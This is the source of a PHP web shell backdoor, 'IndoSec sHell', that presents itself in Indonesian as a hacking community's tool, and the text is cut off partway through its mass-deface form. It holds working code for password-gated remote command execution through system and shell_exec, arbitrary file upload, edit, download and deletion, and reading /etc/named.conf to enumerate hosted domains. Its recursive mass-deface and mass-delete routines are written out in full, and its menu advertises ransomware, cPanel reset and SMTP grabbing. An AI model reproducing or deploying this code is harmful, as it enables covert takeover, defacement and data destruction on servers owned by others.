<?php
/*
	* Konsep Shell : Brillyan -Founder { IndoSec }-
	* Pembuat : Holiq - { IndoSec }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad

	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { IndoSec sHell }
	* Untuk Tools Yang Lain Akan Ditambahkan Di-update Berikutnya..
	* ©2019 { IndoSec } -Holiq-
	* Contact Me? fb.com/holiq.xid   WhatsApp? Cek Bio Fb
*/
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

/* Configurasi */
$aupas 			= "54062f3bf6377d42b4fab7c8fedfc7da";// IndoSec
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';

function login_shell() {
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="{ IndoSec }"/>
		<title>{ IndoSec sHell }</title>
		<link rel='icon' type='image/png' href='https://www.indsc.me/images/logo.png'/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
	</head>
	<body class="bg-dark text-center text-light">
		<div class="container mt-5">
			<div class="form-group">
				<h1 class="text-center">{ INDOSEC }</h1>
				<h5 class="text-center pb-5">Shell Backdoor</h5>
				<form method="post">
					<input type="password" name="pass" placeholder="USER ID" class="form-control"><br/>
					<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
				</form>
			</div>
		</div>
		<a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { IndoSec }</a>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if(empty($aupas) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)))
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
/*
	* Akhir Login
	*
	* Aksi Download
*/
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
?>
<?php
	function w($dir,$perm) {
		if(!is_writable($dir)) {
			return "<font color=red>".$perm."</font>";
		} else {
			return "<font color=lime>".$perm."</font>";
		}
	}
	function r($dir,$perm) {
		if(!is_readable($dir)) {
			return "<font color=red>".$perm."</font>";
		} else {
			return "<font color=lime>".$perm."</font>";
		}
	}

	function exe($cmd) {
		if(function_exists('system')) {
			@ob_start();
			@system($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('exec')) {
			@exec($cmd,$results);
			$buff = "";
			foreach($results as $result) {
				$buff .= $result;
			} return $buff;
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('shell_exec')) {
			$buff = @shell_exec($cmd);
			return $buff;
		}
	}
	
	function perms($file){
		$perms = fileperms($file);
	
		if (($perms & 0xC000) == 0xC000) {
			// Socket
			$info = 's';
		} elseif (($perms & 0xA000) == 0xA000) {
			// Symbolic Link
			$info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) {
			// Regular
			$info = '-';
		} elseif (($perms & 0x6000) == 0x6000) {
			// Block special
			$info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) {
			// Directory
			$info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) {
			// Character special
			$info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) {
			// FIFO pipe
			$info = 'p';
		} else {
			// Unknown
			$info = 'u';
		}
	
		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
		
		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}
	
	
	if(isset($_GET['path'])){
		$path = $_GET['path'];
		chdir($path);
	}else{
		$path = getcwd();
	}
	$path = str_replace('\\','/',$path);
	$paths = explode('/',$path);
	if(isset($_GET['dir'])) {
		$dir = $_GET['dir'];
		chdir($dir);
	} else {
		$dir = getcwd();
	}
	$os = php_uname();
	$ip = getHostByName(getHostName());
	$ver = phpversion();
	$web = $_SERVER['HTTP_HOST'];
	$sof = $_SERVER['SERVER_SOFTWARE'];
	$dir = str_replace("\\","/",$dir);
	$scdir = explode("/", $dir);
	$mysql = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
	$curl = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
	$total = disk_total_space($path);
	$free = disk_free_space($path);
	$pers =  (int) ($free/$total*100);
	
	function formatSize( $bytes ) {
		$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
		for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
		return( round( $bytes, 2 )." ".$types[$i] );
	}
	
	function ambilKata($param, $kata1, $kata2){
		if(strpos($param, $kata1) === FALSE) return FALSE;
		if(strpos($param, $kata2) === FALSE) return FALSE;
		$start = strpos($param, $kata1) + strlen($kata1);
		$end = strpos($param, $kata2, $start);
		$return = substr($param, $start, $end - $start);
		return $return;
	}
	
	$d0mains = @file("/etc/named.conf", false);
	if (!$d0mains) {
		$die = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
		$GLOBALS["need_to_update_header"] = "true";
	}else{ 
		$count = 0;
		foreach ($d0mains as $d0main) {
			if (@strstr($d0main, "zone")) {
				preg_match_all('#zone "(.*)"#', $d0main, $domains);
				flush();
				if (strlen(trim($domains[1][0])) > 2) {
					flush();
					$count++;
				}
			}
		}
		$dom = "$count Domain";
	}
	
?>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1"/>
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="{ IndoSec }"/>
		<link rel="icon" type="image/png" href="https://www.indsc.me/images/logo.png"/>
		<title>{ IndoSec sHell }</title>
		<link rel="stylesheet" href="pojan/assets/css/bootstrap.min.css">
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.min.css"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>		
		<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
	</head>
	<body class="bg-dark text-light">
		<script>
			$(document).ready(function(){
				$(window).scroll(function(){
					if ($(this).scrollTop() > 700) {
						$(".scrollToTop").fadeIn();
					}else{
						$(".scrollToTop").fadeOut();
					}
				});
				$(".scrollToTop").click(function(){
					$("html, body").animate({scrollTop : 0},1000);
					return false;
				});
			});
			$(document).ready(function() {
				$('input[type="file"]').on("change", function() {
					let filenames = [];
					let files = document.getElementById("customFile").files;
					if (files.length > 1) {
						filenames.push("Total Files (" + files.length + ")");
					} else {
						for (let i in files) {
							if (files.hasOwnProperty(i)) {
								filenames.push(files[i].name);
							}
						}
					}
					$(this).next(".custom-file-label").html(filenames.join(","));
				});
			});
		</script>
		<style>
			@import url(https://fonts.googleapis.com/css?family=Lato);
			@import url(https://fonts.googleapis.com/css?family=Quicksand);
			@import url(https://fonts.googleapis.com/css?family=Inconsolata);
			input[type="text"],textarea {font-family: "Inconsolata", monospace;}
			body{margin:0;padding:0;font-family:"Lato";}
			#tab table thead th{padding:5px;font-size:16px;}
			#tab tr {border-bottom:1px solid #fff;}
			#tab tr:hover{background:#5B6F7D; color:#fff;}
			#tab tr td{padding:5px;}
			#tab tr td .badge{font-size:13px;}
			#tab a {color: white;}
			.active,.active:hover{color:#00FF00;}
			a {font-family:"Quicksand"; color:white;}
			a:hover{color:dodgerBlue;}
			.badge{width:30px;}
			.badge:hover{transform: scale(1.1);transition:all.3;cursor:pointer;}
			.ico {width:25px;}
			.ico2{width:30px;}
			.scrollToTop{
				position:fixed;
				bottom:30px;
				right:30px;
				width:35px;
				height:35px;
				background:#262626;
				color:#fff;
				border-radius:15%;
				text-align:center;
				opacity:.5;
			}
			.scrollToTop:hover{color:#fff;}
			.up{font-size:25px;line-height:35px;}
			.lain{color:#888888;font-size:20px;margin-left:5px;top:1px;}
			.lain:hover{color:#fff;}
			.tambah{
				width:35px;
				height:35px;
				line-height:35px;
				border:1px solid;
				border-radius:50%;
				text-align:center;
			}
			.fiture{margin:3px;}
			.tmp th {font-size:14px;}
			.tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;padding:2px 5px;}
			.tmp tr:hover{background:#5B6F7D; color:#fff;}
			.about{color:#000;}
			.about .card-body .img{
				position: relative;
				background: url(https://i.postimg.cc/Wb1X4xNS/image.png);
				background-size: cover;
				width: 150px;
				height: 150px;
			}
			.butn {
				position: relative;
				text-align: center;
				padding: 3px;
				background:rgba(225,225,225,.3);
				-webkit-transition: background 300ms ease, color 300ms ease;
				transition: background 300ms ease, color 300ms ease;
			}
			input[type="radio"].toggle {display:none;}
			input[type="radio"].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
			input[type="radio"].toggle + label:after {
				position: absolute;
				content: "";
				top: 0;
				background: #fff;
				height: 100%;
				width: 100%;
				z-index: -1;
				-webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
				transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
			}
			input[type="radio"].toggle.toggle-left + label:after {left:100%;}
			input[type="radio"].toggle.toggle-right + label {margin-left:-5px;}
			input[type="radio"].toggle.toggle-right + label:after {left:-100%;}
			input[type="radio"].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
			input[type="radio"].toggle:checked + label:after {left:0;}
		</style>
		<nav class="navbar static-top navbar-dark">
			<button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation">
				<i style="color:#fff;" class="fa fa-navicon"></i>
			</button>
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/IndoSecOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/indosec.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/IndoSec" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/indosecid" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://indosec.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ INDOSEC }</h1>
			<center><h5>Shell Backdoor</a></h5></center>
			<hr/>
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
					<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
					<a href="?dir='.$dir.'&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
					<a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
					<a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
					<a href="?dir='.$dir.'&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
					<a href="?dir='.$dir.'&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
					<a href="?dir='.$dir.'&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
					<a href="?dir='.$dir.'&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
					<a href="?dir='.$dir.'&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
					<a href="?dir='.$dir.'&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
					<a href="?dir='.$dir.'&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
					<a href="?dir='.$dir.'&aksi=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
					<a href="?dir='.$dir.'&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
					<a href="?dir='.$dir.'&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
					<a href="?dir='.$dir.'&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
					<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
				</div>
			</div>
			<div class="row">
				<div class="col-md-5"><br/>
					<h5><i class="fa fa-terminal"></i>Terminal : </h5>
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
					</form>
					<hr style="backgroud: white"/>
					<h5><i class="fa fa-search"></i> Informasi : </h5>
					<div class="card table-responsive">
						<div class="card-body">
							<table class="table" style="color: #333">
								<tr>
									<td>PHP</td>
									<td> : '.$ver.'</td>
								</tr>
								<tr>
									<td>IP Server</td>
									<td> : '.$ip.'</td>
								</tr>
								<tr>
									<td>HDD</td>
									<td class="d-flex">Total : '.formatSize($total).' Free : '.formatSize($free).' ['.$pers.'%]</td>
								</tr>
								<tr>
									<td>Domain</td>
									<td>: '.$dom.''.$die.'</td>
								</tr>
								<tr>
									<td>MySQL</td>
									<td>: '.$mysql.'</td>
								</tr>
								<tr>
									<td>cURL</td>
									<td>: '.$curl.'</td>
								</tr>
								<tr>
									<td>Software</td>
									<td>: '.$sof.'</td>
								</tr>
								<tr>
									<td>Sistem Operasi</td>
									<td> : '.$os.'</td>
								</tr>
							</table>
						</div>
					</div><hr/>
				</div>
			<div class="col-md-7 mt-4">';
			
		
		
		//keluar
		if (isset($_GET['keluar'])) {
			session_start();
			session_destroy();
			echo '<script>window.location="?";</script>';
		}
		
		//cmd
		if(isset($_GET['cmd'])){
			echo "<pre class='text-white'>";
			echo system($_GET['cmd']);
			echo "</pre>";
			exit;
		}
		
		//about
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">{ IndoSec }</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">{ IndoSec } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
				</div>
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2019 { IndoSec }</small></p>
				</div>
			</div><br/>';
			exit;
		}
		
		//chmod
		if($_GET['aksi'] == 'chmod') {
			$nama = basename($_GET['file']);
			echo "<form method='POST'>
				<h5>Chmod File : $nama </h5>
				<div class='form-group input-group'>
					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
					<input type='submit' class='btn btn-danger form-control' value='Chmod'>
				</div>
			</form>";
			
			if(isset($_POST['perm'])){
				if(chmod($_GET['file'],$_POST['perm'])){
					echo '<font color="lime">Change Permission Berhasil</font><br/>';
				}else{
					echo '<font color="white">Change Permission Gagal</font><br/>';
				}
			}
		}
		
		if($_GET['aksi'] == 'chmod_dir') {
			$nama = basename(getcwd());
			echo "<form method='POST'>
				<h5>Chmod Folder : $nama </h5>
				<div class='form-group input-group'>
					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
					<input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
				</div>
			</form>";
			if(isset($_POST['chmo'])){
				if(chmod($_GET['dir'],$_POST['perm'])){
					echo '<font color="lime">Change Permission Berhasil</font><br/>';
				}else{
					echo '<font color="white">Change Permission Gagal</font><br/>';
				}
			}
		}
		
		
		//upload
		if ($_GET['aksi'] == 'upload') {
			echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
				<div class="card mt-4">
					<div class="card-body form-group">
						<p class="text-muted">//Multiple Upload</p>
						<div class="custom-file">
							<input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
							<label class="custom-file-label" for="customFile">Choose file</label>
						</div>
						<input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
					</div>
				</div>
			</form>';
			
			
			
			if(isset($_POST['upload'])){
				$jumlah = count($_FILES['file']['name']);
				for($i=0;$i<$jumlah;$i++){
					$filename = $_FILES['file']['name'][$i];
						
						$up = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
						
				}
				if($jumlah < 2) {
					if($up){
						echo '<script>alert("Berhasil Upload '.$filename.'");</script>';
					}else{
						echo '<script>alert("Gagal Upload!!!");</script>';
					}
				}else{
					echo '<script>alert("Berhasil Upload '.$jumlah.' File");</script>';
				}
			}
		}

		//openfile
		if (isset($_GET['file'])) {
			$file = $_GET['file'];
		}
			
		//buat_file
		if ($_GET['aksi'] == 'buat_file') {
			
			echo "
			<h4>
				<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img> Buat File: 
			</h4>
			<form method='POST'>
				<input type='text' class='form-control' name='nama_file' autocomplete='off' placeholder='Nama File...'><br/>
				<textarea name='isi_file' class='form-control' rows='8' placeholder='Isi File...'></textarea><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Bikin!!</button>
			</form>";
		
			if (isset($_POST['bikin'])) {
				$nama_file = $_POST['nama_file'];
				$isi_file = $_POST['isi_file'];
				$handle = fopen("$nama_file", "w");
				
				if (fwrite($handle, $isi_file)) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Buat File Berhasil");</script>';
				}else{ 
					echo '<script>alert("File Gagal Dibuat");</script>';
				}
			}
		}
		
		/*
			View
		*/
		if($_GET['aksi'] == 'view') {
			echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
			echo "
			<textarea rows='9' class='form-control mb-2' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>";
		}
		
		/*
			Edit
		*/
		if($_GET['aksi'] == 'edit') {
			$nama = basename($file);
			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
			echo "<form method='POST'>
				<h5><i class='fa fa-file'></i> Edit File : $nama</h5>
				<textarea rows='9' class='form-control' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea><br/>
					<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
			</form>";
			
			if(isset($_POST['edit_file'])) {
				$updt = fopen("$file", "w");
				$hasil = fwrite($updt, $_POST['isi']);
				
				if ($hasil) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Update!!");</script>';
				}else{
					echo '<script>alert("Gagal Update!!");</script>';
				}
			}
		}
		
		/*
			Rename
		*/
		if($_GET['aksi'] == 'rename') {
			$nama = basename($file);
			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
			echo "<form method='POST'>
				<h5><i class='fa fa-file'></i> Rename File : $nama</h5>
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Masukan Nama Baru...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Update</button>
			</form>";
		
			if(isset($_POST['rename_file'])) {
				$lama = $file;
				$baru = $_POST['namanew'];
				rename( $baru, $lama);
				if(file_exists($baru)) {
					echo '<script>alert("Nama '.$baru.' Telah Digunakan");</script>';
				}else{
					if(rename( $lama, $baru)) {
						echo '<script>window.location="?dir='.$dir.'"; alert("Sukses Mengganti Nama Menjadi '.$baru.'");</script>';
					}else{
						echo '<script>alert("Gagal Mengganti Nama");</script>';
					}
				}
			}
		}
		
		/*
			Delete File
		*/
		if ($_GET['aksi'] == 'hapusf') {
			$nama = basename($file);
			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
			echo "
			<div class='card card-body text-center'>
					<font color='black'>Yakin Menghapus : $nama</font>
				<br/>
				<form method='POST'>
					<a class='btn btn-danger btn-block' href='?dir=$dir'>Tidak</a>
					<input type='submit' name='ya' class='btn btn-success btn-success btn-block' value='Ya'>
				</form>
			</div>";
			
			if ($_POST['ya']) {
				$hapus = unlink($file);
				if ($hapus) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Menghapus File");</script>';
				}else{
					echo '<script>alert("Gagal Menghapus File!");</script>';
				}
			}
		}
		
		
		/*
			Add Folder
		*/
		if ($_GET['aksi'] == 'buat_folder' ) {
			$output = "
			<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img> Buat Folder: </h4>
			<form method='POST'>
				<input type='text' class='form-control' name='nama_folder' autocomplete='off' placeholder='Nama Folder...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='buat'>Buat!!</button>
			</form>";
			echo $output;
		
			if (isset($_POST['buat'])) {
				$nama_folder = $_POST['nama_folder'];
				$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $_POST["nama_folder"]);
				$fd = mkdir ($folder);
				if ($fd) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Membuat Folder '.$folder.'");</script>';
				}else{
					echo "echo '<script> alert('Folder ".$folder." Gagal Dibuat');</script>";
				}
			}
		}
		
		/*
			Delete Folder
		*/
		if ($_GET['aksi'] == 'hapus_folder' ) {
			$nama = basename(getcwd());
			$output ="
			[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
			<div class='card card-body text-center'>
				<font color='black'>Apakah Yakin Menghapus : $nama ?</font>
				<form method='POST'>
					<a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
					<input type='submit' name='ya' class='btn btn-success btn-block' value='Ya'>
				</form>
			</div><br/>";
			echo $output;
			
			if ($_POST['ya']) {
				if(is_dir($dir)) {
					if(is_writable($dir)) {
						@rmdir($dir);
						@exe("rm -rf $dir");
						@exe("rmdir /s /q $dir");
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Menghapus ".$nama."');</script>";
					} else {
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Tidak Dapat Menghapus ".$nama."');</script>";
					}
				}
			}
		exit;
		}
		
		/*
			Rename Folder
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			$nama = basename(getcwd());
			$output="
			[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
			<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img> Rename Folder : $nama </h4>
			<form method='POST'>
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Masukan Nama Baru...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button><br/>
			</form>";
			echo $output;
			
			if (isset($_POST['ganti'])) {
				$lama = $dir;
				$baru = $_POST['namanew'];
				$ubah = rename($lama, $baru);
				if($ubah) {
					echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Mengganti Nama');</script>";
				}else{
					echo "<script>alert('Gagal Mengganti Nama');</script>" ;
				}
			}
			exit;
		}
		
		/*
			* Fungsi_Tambahan
			*
			*
			* mass delete
			* IndoXploit
		*/
		if($_GET['aksi'] == 'masdel') {
			
			function hapus_massal($dir,$namafile) {
				if(is_writable($dir)) {
					$dira = scandir($dir);
					foreach($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc.'/'.$namafile;
						if($dirb === '.') {
							if(file_exists("$dir/$namafile")) {
								unlink("$dir/$namafile");
							}
						} elseif($dirb === '..') {
							if(file_exists("".dirname($dir)."/$namafile")) {
								unlink("".dirname($dir)."/$namafile");
							}
						} else {
							if(is_dir($dirc)) {
								if(is_writable($dirc)) {
									if($lokasi) {
											echo "$lokasi > Terhapus\n";
										unlink($lokasi);
										$massdel = hapus_massal($dirc,$namafile);
									}
								}
							}
						}
					}
				}
			}

			if($_POST['start']) {
				echo "[ <a href='?dir=$dir'>Kembali</a> ]
				<textarea class='form-control' rows='7' disabled=''>";
					hapus_massal($_POST['d_dir'], $_POST['d_file']);
				echo "</textarea><br/>";
			} else {
				echo "<form method='post'>
					<h5><i class='fa fa-folder'></i> Lokasi :</h5>
					<input type='text' name='d_dir' value='$dir' class='form-control'><br>
					<h5><i class ='fa fa-file'></i> Nama File :</h5>
					<input type='text' name='d_file' autocomplete='off' placeholder='[Ex] index.php' class='form-control'><br>
					<input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control'>
			</form>";
			}
			exit;
		}



	/*
		* Mass Deface
		* IndoXploit
	*/
	if($_GET['aksi'] == 'masdef') {
		
		function tipe_massal($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$lokasi = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($lokasi, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($lokasi, $isi_script);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "Done > $lokasi\n";
								file_put_contents($lokasi, $isi_script);
								$masdef = tipe_massal($dirc,$namafile,$isi_script);
							}
						}
					}
				}
			}
		}
		
		function tipe_biasa($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$lokasi = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($lokasi, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($lokasi, $isi_script);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "Done > $dirb/$namafile\n";
								file_put_contents($lokasi, $isi_script);
							}else{
								echo "<p>gagal</p>";
							}
						}
					}
				}
			}
		}
		
		if($_POST['start']) {
			echo "[ <a href='?dir=$dir'>Kembali</a> ]
			<textarea class='form-control' rows='7' disabled=''>";
			if($_POST['tipe'] == 'mahal') {
				tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			} elseif($_POST['tipe'] == 'murah') {
				tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			}
		echo "</textarea><br/>";
		} else {
			echo "<form method='post'>
				<center>
					<h5>Tipe :</h5>
					<input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
					<label for='toggle-on' class='butn'>Biasa</label>
					<input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
					<label for='toggle-off' class='butn'>Masal</label>
				</center> 
				<h5><i class='fa fa-folder'></i> Lokasi :</h5>
				<input type='text' name='d_dir' value='$dir' class='form-control'><br>
				<h5><i class ='fa fa-file'></i> Nama File :</h5>
